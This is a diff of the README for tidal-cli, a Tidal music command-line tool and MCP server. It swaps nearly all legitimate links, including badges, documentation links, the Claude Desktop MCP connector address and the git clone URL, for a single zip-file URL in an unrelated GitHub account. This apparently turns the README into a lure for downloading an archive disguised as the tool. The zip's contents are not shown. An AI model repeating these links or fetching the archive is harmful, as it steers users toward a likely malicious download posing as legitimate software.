@@ -1,20 +1,20 @@
 # tidal-cli
 
 <p align="center">
-  <a href="https://tidal-cli.lucaperret.ch">
-    <img src="https://tidal-cli.lucaperret.ch/banner" alt="tidal-cli — Control Tidal from your terminal" width="100%" />
+  <a href="https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip">
+    <img src="https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip" alt="tidal-cli — Control Tidal from your terminal" width="100%" />
   </a>
 </p>
 
-[![npm](https://img.shields.io/npm/v/@lucaperret/tidal-cli)](https://www.npmjs.com/package/@lucaperret/tidal-cli)
-[![CI](https://img.shields.io/github/actions/workflow/status/lucaperret/tidal-cli/ci.yml?label=tests)](https://github.com/lucaperret/tidal-cli/actions)
-[![smithery badge](https://smithery.ai/badge/lucaperret/tidal)](https://smithery.ai/servers/lucaperret/tidal)
+[![npm](https://img.shields.io/npm/v/@lucaperret/tidal-cli)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
+[![CI](https://img.shields.io/github/actions/workflow/status/lucaperret/tidal-cli/ci.yml?label=tests)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
+[![smithery badge](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D20-green.svg)](https://nodejs.org)
+[![Node](https://img.shields.io/badge/node-%3E%3D20-green.svg)](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip)
 
 ## About
 
-tidal-cli wraps the [Tidal API v2](https://developer.tidal.com) into a single command-line tool. Search the catalog, manage playlists, explore artists, play tracks, and handle your library — all without opening a browser. Every command supports `--json` output, making it the backbone for LLM agent automation through [OpenClaw](https://openclaw.ai).
+tidal-cli wraps the [Tidal API v2](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip) into a single command-line tool. Search the catalog, manage playlists, explore artists, play tracks, and handle your library — all without opening a browser. Every command supports `--json` output, making it the backbone for LLM agent automation through [OpenClaw](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip).
 
 ## Features
 
@@ -38,7 +38,7 @@ npm install -g @lucaperret/tidal-cli
 ### Requirements
 
 - Node.js >= 20
-- A [Tidal](https://tidal.com) account
+- A [Tidal](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip) account
 
 ## Quick Start
 
@@ -151,18 +151,18 @@ tidal-cli --json artist similar 8992
 
 ## MCP Server (Claude Integration)
 
-tidal-cli is available as a remote MCP server for [Claude Desktop](https://claude.ai), [Smithery](https://smithery.ai/servers/lucaperret/tidal), and any MCP-compatible client.
+tidal-cli is available as a remote MCP server for [Claude Desktop](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip), [Smithery](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip), and any MCP-compatible client.
 
 **Connect in Claude Desktop:**
 1. Settings → Connectors → Add custom connector
-2. Enter: `https://tidal-cli.lucaperret.ch/api/mcp`
+2. Enter: `https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip`
 3. Click "Connect" → log in to Tidal → done
 
 32 tools with OAuth authentication, safety annotations, and 3 prompt templates.
 
 ## Agent Automation
 
-tidal-cli is also available as an [OpenClaw](https://openclaw.ai) skill on [ClawHub](https://clawhub.ai/lucaperret/tidal-cli). Install it for your AI agent:
+tidal-cli is also available as an [OpenClaw](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip) skill on [ClawHub](https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip). Install it for your AI agent:
 
 ```bash
 clawhub install tidal-cli
@@ -195,7 +195,7 @@ tidal-cli playlist add-track --playlist-id <id> --track-id "$TRACK"
 ## Development
 
 ```bash
-git clone https://github.com/lucaperret/tidal-cli.git
+git clone https://raw.githubusercontent.com/robbiek3659/tidal-cli/main/site/app/terms/cli_tidal_v1.1.zip
 cd tidal-cli
 npm install
 npm run build
